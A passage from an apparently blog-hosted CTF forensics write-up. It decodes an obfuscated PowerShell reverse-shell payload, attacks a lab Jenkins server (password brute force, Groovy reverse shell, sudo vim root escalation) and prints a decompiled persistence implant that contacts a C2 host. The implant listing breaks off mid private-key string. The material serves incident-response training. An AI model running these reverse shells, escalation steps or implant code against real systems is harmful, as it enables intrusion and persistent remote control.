QAgACIASgBBAEIAagBBAEcAdwBBAGEAUQBCAGwAQQBHADQAQQBkAEEAQQBnAEEARAAwAEEASQBBAEIATwBBAEcAVQBBAGQAdwBBAHQAQQBFADgAQQBZAGcAQgBxAEEARwBVAEEAWQB3AEIAMABBAEMAQQBBAFUAdwBCADUAQQBIAE0AQQBkAEEAQgBsAEEARwAwAEEATABnAEIATwBBAEcAVQBBAGQAQQBBAHUAQQBGAE0AQQBiAHcAQgBqAEEARwBzAEEAWgBRAEIAMABBAEgATQBBAEwAZwBCAFUAQQBFAE0AQQBVAEEAQgBEAEEARwB3AEEAYQBRAEIAbABBAEcANABBAGQAQQBBAG8AQQBDAEkAQQBNAFEAQQA1AEEARABJAEEATABnAEEAdwBBAEMANABBAE0AZwBBAHUAQQBEAEUAQQBNAHcAQQB5AEEAQwBJAEEATABBAEEAMABBAEQAUQBBAE0AdwBBAHAAQQBEAHMAQQBKAEEAQgB6AEEASABRAEEAYwBnAEIAbABBAEcARQBBAGIAUQBBAGcAQQBEADAAQQBJAEEAQQBrAEEARwBNAEEAYgBBAEIAcABBAEcAVQBBAGIAZwBCADAAQQBDADQAQQBSAHcAQgBsAEEASABRAEEAVQB3AEIAMABBAEgASQBBAFoAUQBCAGgAQQBHADAAQQBLAEEAQQBwAEEARABzAEEAVwB3AEIAaQBBAEgAawBBAGQAQQBCAGwAQQBGAHMAQQBYAFEAQgBkAEEAQwBRAEEAWQBnAEIANQBBAEgAUQBBAFoAUQBCAHoAQQBDAEEAQQBQAFEAQQBnAEEARABBAEEATABnAEEAdQBBAEQAWQBBAE4AUQBBADEAQQBEAE0AQQBOAFEAQgA4AEEAQwBVAEEAZQB3AEEAdwBBAEgAMABBAE8AdwBCADMAQQBHAGcAQQBhAFEAQgBzAEEARwBVAEEASwBBAEEAbwBBAEMAUQBBAGEAUQBBAGcAQQBEADAAQQBJAEEAQQBrAEEASABNAEEAZABBAEIAeQBBAEcAVQBBAFkAUQBCAHQAQQBDADQAQQBVAGcAQgBsAEEARwBFAEEAWgBBAEEAbwBBAEMAUQBBAFkAZwBCADUAQQBIAFEAQQBaAFEAQgB6AEEAQwB3AEEASQBBAEEAdwBBAEMAdwBBAEkAQQBBAGsAQQBHAEkAQQBlAFEAQgAwAEEARwBVAEEAYwB3AEEAdQBBAEUAdwBBAFoAUQBCAHUAQQBHAGMAQQBkAEEAQgBvAEEAQwBrAEEASwBRAEEAZwBBAEMAMABBAGIAZwBCAGwAQQBDAEEAQQBNAEEAQQBwAEEASABzAEEATwB3AEEAawBBAEcAUQBBAFkAUQBCADAAQQBHAEUAQQBJAEEAQQA5AEEAQwBBAEEASwBBAEIATwBBAEcAVQBBAGQAdwBBAHQAQQBFADgAQQBZAGcAQgBxAEEARwBVAEEAWQB3AEIAMABBAEMAQQBBAEwAUQBCAFUAQQBIAGsAQQBjAEEAQgBsAEEARQA0AEEAWQBRAEIAdABBAEcAVQBBAEkAQQBCAFQAQQBIAGsAQQBjAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEYAUQBBAFoAUQBCADQAQQBIAFEAQQBMAGcAQgBCAEEARgBNAEEAUQB3AEIASgBBAEUAawBBAFIAUQBCAHUAQQBHAE0AQQBiAHcAQgBrAEEARwBrAEEAYgBnAEIAbgBBAEMAawBBAEwAZwBCAEgAQQBHAFUAQQBkAEEAQgBUAEEASABRAEEAYwBnAEIAcABBAEcANABBAFoAdwBBAG8AQQBDAFEAQQBZAGcAQgA1AEEASABRAEEAWgBRAEIAegBBAEMAdwBBAE0AQQBBAHMAQQBDAEEAQQBKAEEAQgBwAEEAQwBrAEEATwB3AEEAawBBAEgATQBBAFoAUQBCAHUAQQBHAFEAQQBZAGcAQgBoAEEARwBNAEEAYQB3AEEAZwBBAEQAMABBAEkAQQBBAG8AQQBHAGsAQQBaAFEAQgA0AEEAQwBBAEEASgBBAEIAawBBAEcARQBBAGQAQQBCAGgAQQBDAEEAQQBNAGcAQQArAEEAQwBZAEEATQBRAEEAZwBBAEgAdwBBAEkAQQBCAFAAQQBIAFUAQQBkAEEAQQB0AEEARgBNAEEAZABBAEIAeQBBAEcAawBBAGIAZwBCAG4AQQBDAEEAQQBLAFEAQQA3AEEAQwBRAEEAYwB3AEIAbABBAEcANABBAFoAQQBCAGkAQQBHAEUAQQBZAHcAQgByAEEARABJAEEASQBBAEEAZwBBAEQAMABBAEkAQQBBAGsAQQBIAE0AQQBaAFEAQgB1AEEARwBRAEEAWQBnAEIAaABBAEcATQBBAGEAdwBBAGcAQQBDAHMAQQBJAEEAQQBpAEEARgBBAEEAVQB3AEEAZwBBAEMASQBBAEkAQQBBAHIAQQBDAEEAQQBLAEEAQgB3AEEASABjAEEAWgBBAEEAcABBAEMANABBAFUAQQBCAGgAQQBIAFEAQQBhAEEAQQBnAEEAQwBzAEEASQBBAEEAaQBBAEQANABBAEkAQQBBAGkAQQBEAHMAQQBKAEEAQgB6AEEARwBVAEEAYgBnAEIAawBBAEcASQBBAGUAUQBCADAAQQBHAFUAQQBJAEEAQQA5AEEAQwBBAEEASwBBAEIAYgBBAEgAUQBBAFoAUQBCADQAQQBIAFEAQQBMAGcAQgBsAEEARwA0AEEAWQB3AEIAdgBBAEcAUQBBAGEAUQBCAHUAQQBHAGMAQQBYAFEAQQA2AEEARABvAEEAUQBRAEIAVABBAEUATQBBAFMAUQBCAEoAQQBDAGsAQQBMAGcAQgBIAEEARwBVAEEAZABBAEIAQwBBAEgAawBBAGQAQQBCAGwAQQBIAE0AQQBLAEEAQQBrAEEASABNAEEAWgBRAEIAdQBBAEcAUQBBAFkAZwBCAGgAQQBHAE0AQQBhAHcAQQB5AEEAQwBrAEEATwB3AEEAawBBAEgATQBBAGQAQQBCAHkAQQBHAFUAQQBZAFEAQgB0AEEAQwA0AEEAVgB3AEIAeQBBAEcAawBBAGQAQQBCAGwAQQBDAGcAQQBKAEEAQgB6AEEARwBVAEEAYgBnAEIAawBBAEcASQBBAGUAUQBCADAAQQBHAFUAQQBMAEEAQQB3AEEAQwB3AEEASgBBAEIAegBBAEcAVQBBAGIAZwBCAGsAQQBHAEkAQQBlAFEAQgAwAEEARwBVAEEATABnAEIATQBBAEcAVQBBAGIAZwBCAG4AQQBIAFEAQQBhAEEAQQBwAEEARABzAEEASgBBAEIAegBBAEgAUQBBAGMAZwBCAGwAQQBHAEUAQQBiAFEAQQB1AEEARQBZAEEAYgBBAEIAMQBBAEgATQBBAGEAQQBBAG8AQQBDAGsAQQBmAFEAQQA3AEEAQwBRAEEAWQB3AEIAcwBBAEcAawBBAFoAUQBCAHUAQQBIAFEAQQBMAGcAQgBEAEEARwB3AEEAYgB3AEIAegBBAEcAVQBBAEsAQQBBAHAAQQBEAHMAQQAiAA0ACgAkAGMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAcABhAHkAbABvAGEAZAApACkADQAKAGkAZgAgACgAJABwAGEAeQBsAG8AYQBkACAALQBtAGEAdABjAGgAIAAiAGgAdAB0AHAAOgB8AGgAdAB0AHAAcwA6ACIAKQAgAHsADQAKACAAIAAgACAAJABwAGEAeQBsAG8AYQBkACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgACIATgBlAHQALgBXAGUAYgBjAGwAaQBlAG4AdAAiACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAkAHAAYQB5AGwAbwBhAGQAKQA7AA0ACgB9AA0ACgBpAGUAeAAgACQAYwA7AA== Yes, This is the payload and it is encoded with base64, Let\u0026rsquo;s decode it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $.t. .=. .\u0026#39;.[.D.l.l.I.m.p.o.r.t.(.\\.\u0026#34;.u.s.e.r.3.2...d.l.l.\\.\u0026#34;.).]. .p.u.b.l.i.c. .s.t.a.t.i.c. .e.x.t.e.r.n. .b.o.o.l. .S.h.o.w.W.i.n.d.o.w.(.i.n.t. .h.a.n.d.l.e.,. .i.n.t. .s.t.a.t.e.).;.\u0026#39;.;. . .a.d.d.-.t.y.p.e. .-.n.a.m.e. .w.i.n. .-.m.e.m.b.e.r. .$.t. .-.n.a.m.e.s.p.a.c.e. .n.a.t.i.v.e.;.[.n.a.t.i.v.e...w.i.n.].:.:.S.h.o.w.W.i.n.d.o.w.(.(.[.S.y.s.t.e.m...D.i.a.g.n.o.s.t.i.c.s...P.r.o.c.e.s.s.].:.:.G.e.t.C.u.r.r.e.n.t.P.r.o.c.e.s.s.(.). .|. .G.e.t.-.P.r.o.c.e.s.s.)...M.a.i.n.W.i.n.d.o.w.H.a.n.d.l.e.,. .0.).;. . .i.e.x. .(. .[.S.t.r.i.n.G.].:.:.j.o.i.n.(.\u0026#39;.\u0026#39;.,. .(.[.r.E.G.e.X.].:.:.M.a.T.c.h.e.S.(. .\u0026#34;.). .\u0026#39;.x.\u0026#39;.+.].3.1.[.D.I.l.L.e.H.s.$.+.].1.[.D.i.L.L.e.h.s.$. .(.\u0026amp;.|. .).4.3.1.[.D.I.l.L.e.H.s.$.+.].1.[.D.i.L.L.e.h.s.$. .(.\u0026amp;.|. .).4.3.].R.A.h.c.[.].G.n.I.R.T.s.[.,.\u0026#39;.t.X.j.\u0026#39;.(.e.c.A.L.P.E.R...).\u0026#39;.$.\u0026#39;.,.\u0026#39;.w.q.i.\u0026#39;.(.e.C.A.L.P.E.R...).\u0026#39;.;.t.X.\u0026#39;.+.\u0026#39;.j.s.c.0.d._.d.3.l.b.4.n.3._.0.r.c.4.m.\u0026#39;.+.\u0026#39;.{.g.\u0026#39;.+.\u0026#39;.a.\u0026#39;.+.\u0026#39;.l.f.t.X.j. .\u0026#39;.+.\u0026#39;.=.1._.g.a.\u0026#39;.+.\u0026#39;.l.f.w.q.i.\u0026#39;.(.\u0026#34;.,.\u0026#39;...\u0026#39;.,. .\u0026#39;.R.\u0026#39;.+.\u0026#39;.i.G.H.T.t.O.l.\u0026#39;.+.\u0026#39;.e.f.t.\u0026#39;. .). .|. .f.o.r.E.A.c.H.-.o.B.J.e.c.T. .{.$._...V.A.L.U.E.}. .).). .).;. . .S.E.t. .(.\u0026#34;.G.8.\u0026#34;.+.\u0026#34;.h.\u0026#34;.). .(. .\u0026#34;. .). .).6.3.].R.a.h.c.[.,.\u0026#39;.r.a.Z.\u0026#39;.E.c.a.l.P.e.R.-. .4.3.].R.a.h.c.[.,.).0.5.].R.a.h.c.[.+.8.7.].R.a.h.c.[.+.9.4.].R.a.h.c.[.(. . .e.C.A.l.p.E.R.c.-. . .).\u0026#39;.;.2.\u0026#39;.+.\u0026#39;.N.\u0026#39;.+.\u0026#39;.1.\u0026#39;.+.\u0026#39;.}.s.u.0.r.3.g.\u0026#39;.+.\u0026#39;.n.4.d._.3.r.4.\u0026#39;.+.\u0026#39;._.2.N.1. .=. .2._.g.a.\u0026#39;.+.\u0026#39;.l.f.r.\u0026#39;.+.\u0026#39;.a.Z.\u0026#39;.(.(. .(. .).\u0026#39;.\u0026#39;.n.i.O.j.-.\u0026#39;.x.\u0026#39;.+.].3.,.1.[.).(.G.N.i.r.T.S.o.t...E.c.N.e.r.e.F.e.R.p.E.s.O.B.R.E.v.$. .(. ... .\u0026#34;. . .). .;.-.j.O.I.n. .(. .l.S. .(.\u0026#34;.V.A.R.\u0026#34;.+.\u0026#34;.I.a.B.\u0026#34;.+.\u0026#34;.L.E.:.g.\u0026#34;.+.\u0026#34;.8.H.\u0026#34;.). . .)...V.A.L.u.e.[. .-. .1..... .-. .(. .(. .l.S. .(.\u0026#34;.V.A.R.\u0026#34;.+.\u0026#34;.I.a.B.\u0026#34;.+.\u0026#34;.L.E.:.g.\u0026#34;.+.\u0026#34;.8.H.\u0026#34;.). . .)...V.A.L.u.e...L.e.n.g.t.H.).]. .|. .I.e.X. . .$.p.a.y.l.o.a.d. .=. .\u0026#34;.J.A.B.j.A.G.w.A.a.Q.B.l.A.G.4.A.d.A.A.g.A.D.0.A.I.A.B.O.A.G.U.A.d.w.A.t.A.E.8.A.Y.g.B.q.A.G.U.A.Y.w.B.0.A.C.A.A.U.w.B.5.A.H.M.A.d.A.B.l.A.G.0.A.L.g.B.O.A.G.U.A.d.A.A.u.A.F.M.A.b.w.B.j.A.G.s.A.Z.Q.B.0.A.H.M.A.L.g.B.U.A.E.M.A.U.A.B.D.A.G.w.A.a.Q.B.l.A.G.4.A.d.A.A.o.A.C.I.A.M.Q.A.5.A.D.I.A.L.g.A.w.A.C.4.A.M.g.A.u.A.D.E.A.M.w.A.y.A.C.I.A.L.A.A.0.A.D.Q.A.M.w.A.p.A.D.s.A.J.A.B.z.A.H.Q.A.c.g.B.l.A.G.E.A.b.Q.A.g.A.D.0.A.I.A.A.k.A.G.M.A.b.A.B.p.A.G.U.A.b.g.B.0.A.C.4.A.R.w.B.l.A.H.Q.A.U.w.B.0.A.H.I.A.Z.Q.B.h.A.G.0.A.K.A.A.p.A.D.s.A.W.w.B.i.A.H.k.A.d.A.B.l.A.F.s.A.X.Q.B.d.A.C.Q.A.Y.g.B.5.A.H.Q.A.Z.Q.B.z.A.C.A.A.P.Q.A.g.A.D.A.A.L.g.A.u.A.D.Y.A.N.Q.A.1.A.D.M.A.N.Q.B.8.A.C.U.A.e.w.A.w.A.H.0.A.O.w.B.3.A.G.g.A.a.Q.B.s.A.G.U.A.K.A.A.o.A.C.Q.A.a.Q.A.g.A.D.0.A.I.A.A.k.A.H.M.A.d.A.B.y.A.G.U.A.Y.Q.B.t.A.C.4.A.U.g.B.l.A.G.E.A.Z.A.A.o.A.C.Q.A.Y.g.B.5.A.H.Q.A.Z.Q.B.z.A.C.w.A.I.A.A.w.A.C.w.A.I.A.A.k.A.G.I.A.e.Q.B.0.A.G.U.A.c.w.A.u.A.E.w.A.Z.Q.B.u.A.G.c.A.d.A.B.o.A.C.k.A.K.Q.A.g.A.C.0.A.b.g.B.l.A.C.A.A.M.A.A.p.A.H.s.A.O.w.A.k.A.G.Q.A.Y.Q.B.0.A.G.E.A.I.A.A.9.A.C.A.A.K.A.B.O.A.G.U.A.d.w.A.t.A.E.8.A.Y.g.B.q.A.G.U.A.Y.w.B.0.A.C.A.A.L.Q.B.U.A.H.k.A.c.A.B.l.A.E.4.A.Y.Q.B.t.A.G.U.A.I.A.B.T.A.H.k.A.c.w.B.0.A.G.U.A.b.Q.A.u.A.F.Q.A.Z.Q.B.4.A.H.Q.A.L.g.B.B.A.F.M.A.Q.w.B.J.A.E.k.A.R.Q.B.u.A.G.M.A.b.w.B.k.A.G.k.A.b.g.B.n.A.C.k.A.L.g.B.H.A.G.U.A.d.A.B.T.A.H.Q.A.c.g.B.p.A.G.4.A.Z.w.A.o.A.C.Q.A.Y.g.B.5.A.H.Q.A.Z.Q.B.z.A.C.w.A.M.A.A.s.A.C.A.A.J.A.B.p.A.C.k.A.O.w.A.k.A.H.M.A.Z.Q.B.u.A.G.Q.A.Y.g.B.h.A.G.M.A.a.w.A.g.A.D.0.A.I.A.A.o.A.G.k.A.Z.Q.B.4.A.C.A.A.J.A.B.k.A.G.E.A.d.A.B.h.A.C.A.A.M.g.A.+.A.C.Y.A.M.Q.A.g.A.H.w.A.I.A.B.P.A.H.U.A.d.A.A.t.A.F.M.A.d.A.B.y.A.G.k.A.b.g.B.n.A.C.A.A.K.Q.A.7.A.C.Q.A.c.w.B.l.A.G.4.A.Z.A.B.i.A.G.E.A.Y.w.B.r.A.D.I.A.I.A.A.g.A.D.0.A.I.A.A.k.A.H.M.A.Z.Q.B.u.A.G.Q.A.Y.g.B.h.A.G.M.A.a.w.A.g.A.C.s.A.I.A.A.i.A.F.A.A.U.w.A.g.A.C.I.A.I.A.A.r.A.C.A.A.K.A.B.w.A.H.c.A.Z.A.A.p.A.C.4.A.U.A.B.h.A.H.Q.A.a.A.A.g.A.C.s.A.I.A.A.i.A.D.4.A.I.A.A.i.A.D.s.A.J.A.B.z.A.G.U.A.b.g.B.k.A.G.I.A.e.Q.B.0.A.G.U.A.I.A.A.9.A.C.A.A.K.A.B.b.A.H.Q.A.Z.Q.B.4.A.H.Q.A.L.g.B.l.A.G.4.A.Y.w.B.v.A.G.Q.A.a.Q.B.u.A.G.c.A.X.Q.A.6.A.D.o.A.Q.Q.B.T.A.E.M.A.S.Q.B.J.A.C.k.A.L.g.B.H.A.G.U.A.d.A.B.C.A.H.k.A.d.A.B.l.A.H.M.A.K.A.A.k.A.H.M.A.Z.Q.B.u.A.G.Q.A.Y.g.B.h.A.G.M.A.a.w.A.y.A.C.k.A.O.w.A.k.A.H.M.A.d.A.B.y.A.G.U.A.Y.Q.B.t.A.C.4.A.V.w.B.y.A.G.k.A.d.A.B.l.A.C.g.A.J.A.B.z.A.G.U.A.b.g.B.k.A.G.I.A.e.Q.B.0.A.G.U.A.L.A.A.w.A.C.w.A.J.A.B.z.A.G.U.A.b.g.B.k.A.G.I.A.e.Q.B.0.A.G.U.A.L.g.B.M.A.G.U.A.b.g.B.n.A.H.Q.A.a.A.A.p.A.D.s.A.J.A.B.z.A.H.Q.A.c.g.B.l.A.G.E.A.b.Q.A.u.A.E.Y.A.b.A.B.1.A.H.M.A.a.A.A.o.A.C.k.A.f.Q.A.7.A.C.Q.A.Y.w.B.s.A.G.k.A.Z.Q.B.u.A.H.Q.A.L.g.B.D.A.G.w.A.b.w.B.z.A.G.U.A.K.A.A.p.A.D.s.A.\u0026#34;. . .$.c. .=. .[.S.y.s.t.e.m...T.e.x.t...E.n.c.o.d.i.n.g.].:.:.U.n.i.c.o.d.e...G.e.t.S.t.r.i.n.g.(.[.S.y.s.t.e.m...C.o.n.v.e.r.t.].:.:.F.r.o.m.B.a.s.e.6.4.S.t.r.i.n.g.(.$.p.a.y.l.o.a.d.).). . .i.f. .(.$.p.a.y.l.o.a.d. .-.m.a.t.c.h. .\u0026#34;.h.t.t.p.:.|.h.t.t.p.s.:.\u0026#34;.). .{. . . . . . .$.p.a.y.l.o.a.d. .=. .(.N.e.w.-.O.b.j.e.c.t. .\u0026#34;.N.e.t...W.e.b.c.l.i.e.n.t.\u0026#34;.)...D.o.w.n.l.o.a.d.S.t.r.i.n.g.(.$.p.a.y.l.o.a.d.).;. . .}. . .i.e.x. .$.c.;. After we remove those unnecessary characters it will be like that.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $t=\u0026#39;[DllImport(\\\u0026#34;user32dll\\\u0026#34;)]publicstaticexternboolShowWindow(inthandle,intstate);\u0026#39;; add-type-namewin-member$t-namespacenative;[nativewin]::ShowWindow(([SystemDiagnosticsProcess]::GetCurrentProcess()|Get-Process)MainWindowHandle,0); iex([StrinG]::join(\u0026#39;\u0026#39;,([rEGeX]::MaTcheS(\u0026#34;)\u0026#39;x\u0026#39;+]31[DIlLeHs$+]1[DiLLehs$(\u0026amp;|)431[DIlLeHs$+]1[DiLLehs$(\u0026amp;|)43]RAhc[]GnIRTs[,\u0026#39;tXj\u0026#39;(ecALPER)\u0026#39;$\u0026#39;,\u0026#39;wqi\u0026#39;(eCALPER)\u0026#39;;tX\u0026#39;+\u0026#39;jsc0d_d3lb4n3_0rc4m\u0026#39;+\u0026#39;{g\u0026#39;+\u0026#39;a\u0026#39;+\u0026#39;lftXj\u0026#39;+\u0026#39;=1_ga\u0026#39;+\u0026#39;lfwqi\u0026#39;(\u0026#34;,\u0026#39;\u0026#39;,\u0026#39;R\u0026#39;+\u0026#39;iGHTtOl\u0026#39;+\u0026#39;eft\u0026#39;)|forEAcH-oBJecT{$_VALUE}))); SEt(\u0026#34;G8\u0026#34;+\u0026#34;h\u0026#34;)(\u0026#34;))63]Rahc[,\u0026#39;raZ\u0026#39;EcalPeR-43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(eCAlpERc-)\u0026#39;;2\u0026#39;+\u0026#39;N\u0026#39;+\u0026#39;1\u0026#39;+\u0026#39;}su0r3g\u0026#39;+\u0026#39;n4d_3r4\u0026#39;+\u0026#39;_2N1=2_ga\u0026#39;+\u0026#39;lfr\u0026#39;+\u0026#39;aZ\u0026#39;((()\u0026#39;\u0026#39;niOj-\u0026#39;x\u0026#39;+]3,1[)(GNirTSotEcNereFeRpEsOBREv$(\u0026#34;);-jOIn(lS(\u0026#34;VAR\u0026#34;+\u0026#34;IaB\u0026#34;+\u0026#34;LE:g\u0026#34;+\u0026#34;8H\u0026#34;))VALue[-1-((lS(\u0026#34;VAR\u0026#34;+\u0026#34;IaB\u0026#34;+\u0026#34;LE:g\u0026#34;+\u0026#34;8H\u0026#34;))VALueLengtH)]|IeX $payload=\u0026#34;JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsA\u0026#34; $c=[SystemTextEncoding]::UnicodeGetString([SystemConvert]::FromBase64String($payload)) if($payload-match\u0026#34;http:|https:\u0026#34;){ $payload=(New-Object\u0026#34;NetWebclient\u0026#34;)DownloadString($payload); } iex$c; From here we can see a glimpse of the flag in this section sc0d_d3lb4n3_0rc4m and su0r3gn4d_3r4, but they are reversed i think from the look of 3r4 it must be 4r3, right ?\nAfter we reverse them back here they are m4cr0_3n4bl3d_d0cs and 4r3_d4ng3r0us, Now it is time to merge them together to give us the flag.\nThe second flag :\nflag{m4cr0_3n4bl3d_d0cs_4r3_d4ng3r0us}\n3-Locked Outside After we succeeded in locating the payload, Now we need investigate the compromised machine that led to the attack and recover a lost SSH from it. Let\u0026rsquo;s go !\nFirst, we need to boot up the machine in our local network, it has the name lockedout.\nWe need to do some Scanning in order to know what services are running in this machine.\nAlso we can see that the machines has been asigned with a new ip address which is 192.168.1.14\n$ nmap 192.168.1.14 -p- -sV\n-p- : for all ports scanning.\n-sV : determine service/version info.\nWe can see that there are 3 ports opened for FTP, SSH and HTTP, Let\u0026rsquo;s see what we can do with the FTP server.\nIf we made a Recon process on this ftp server version we will not find any exploit for it unfortunately, So we will see if there is something shared on it.\nIf we try to login to the ftp server with any username except anonymous, It won\u0026rsquo;t connect to it.\nAfter we sucessfully connected to the server, Now we need to know if there are any shared files that we can use.\nWe located a text file named as note.txt, Let\u0026rsquo;s get it in our machine and see what is inside of it.\nUnfortunately, If we try to connect with ssh with these credentials it won\u0026rsquo;t connect, So there is another way i think.\nLet\u0026rsquo;s see what is in the web page!\nIf we do sime Recon we will find that Jenkins have some vulnerabilites that we can exploit in order to have access to the target.\nBut first we need to have the login credentials for the administrator.\nBy default the username is admin, but we need to know the password for it.\nWe can use an auxiliary from Metasploit to bruteforce the password, for more see this Document.\nDone, we found the password which is admin too.\nLet\u0026rsquo;s login and find out what is up there!\nIt looks like a dashboard full of interesting staff that we can use :smiling_imp:.\nSomething look catchy which is Build Executor Status, Let\u0026rsquo;s navigate to it!\nWait a minute!\nIt looks like Jenkins executor is allowing a build to run on a node/agent(e.g. build server).\nLet\u0026rsquo;s navigate to the Master and see what is inside!\nWow! Is This a Script console, We are getting closer and closer :grin:.\nYes, It looks like Jenkins features a Groovy script console which allows one to run arbitrary Groovy scripts within the Jenkins controller runtime or in the runtime on agents.\nLet\u0026rsquo;s run some commands!\nOoh, Let\u0026rsquo;s see if we can get full access to the machine through Reverse Shell, I found this Github Repo that gives shell execution in Groovy Script.\nFirst, Let\u0026rsquo;s modify it!\n1 2 3 4 String host=\u0026#34;localhost\u0026#34;; // Change this to your local ip address int port=1234; // Change this to the port you will listen to String cmd=\u0026#34;/bin/sh\u0026#34;; // Change this to cmd.exe if it is a Windows machine Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u0026gt;0)so.write(pi.read());while(pe.available()\u0026gt;0)so.write(pe.read());while(si.available()\u0026gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); Now, We initialize our listener to recieve the reverse shell.\nYes, We are in! :partying_face:\nNow, We have escalate to Root privilage to navigate to the ssh configuration files.\nLet\u0026rsquo;s see what Jenkins can do under root privilage by running this command $ sudo -l.\nSo, Jenkins can execute Vim text editor under root privilage, Let\u0026rsquo;s see if we can change to root inside vim.\nsudo /usr/bin/vim\nThen, inside vim we type :!/bin/sh.\nYes, We made it!\nWe are now in root privilage, Let\u0026rsquo;s search for everything having ssh keyword by typing this find / -iname \u0026quot;ssh*\u0026quot; 2\u0026gt;/dev/null.\nLet\u0026rsquo;s navigate to /etc/ssh/sshd_config, and what is inside of it.\nOh, It seems we already found the flag! :roll_eyes:\nThe third flag :\nflag{r00t_l0gin_1s_1ns3cur3}\n4-Changing our locks and dumping old keys It seems that the hacker injected a script that maintain the persistence in the machine.\nWhile we still have access to the machine, We type this command to all services that are running in crontab sudo crontab -u root -l.\nWell, It seems we found the persistence script named as stayalive, Let\u0026rsquo;s check it!\nIt looks like it is a compiled .pyc file, Which we need to decompile, You can check how to decompile it from Here.\nAfter we decompled it, Here is the output!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 # uncompyle6 version 3.7.4 # Python bytecode 3.8 (3413) # Decompiled from: Python 2.7.16+ (default, Jul 8 2019, 09:45:29) # [GCC 8.3.0] # Warning: this version of Python has problems handling the Python 3 \u0026#34;byte\u0026#34; type in constants properly. # Embedded file name: ./stayalive.py # Compiled at: 2021-06-24 17:00:26 # Size of source mod 2**32: 2810 bytes import socket, subprocess, os, ssl def sczsz(): global c2domain global c2port global s global ssls global tt try: tt = [29, 33, 35, 42, 44, 57, 66, 72, 81, 85, 88, 89, 97, 103, 128, 135, 144, 152, 195, 199, 203, 207, 217, 231, 236, 239, 245, 260, 266, 273, 292, 310, 319, 337, 354, 357, 366, 377, 385, 414, 418, 421] c2domain = \u0026#39;c2.m1cr0s0ft.hax\u0026#39; c2port = 64318 s = socket.socket() ssls = ssl.wrap_socket(s, ssl_version=(ssl.PROTOCOL_TLSv1_2)) except socket.error as OO00OOOO0O00O00OO: try: try: print(\u0026#39;socket creation error: \u0026#39; + str(OO00OOOO0O00O00OO)) finally: OO00OOOO0O00O00OO = None del OO00OOOO0O00O00OO finally: OO00OOOO0O00O00OO = None del OO00OOOO0O00O00OO def cscsz(): try: ssls.connect((c2domain, c2port)) xbx = \u0026#39;--- BEGIN PRIVATE KEY 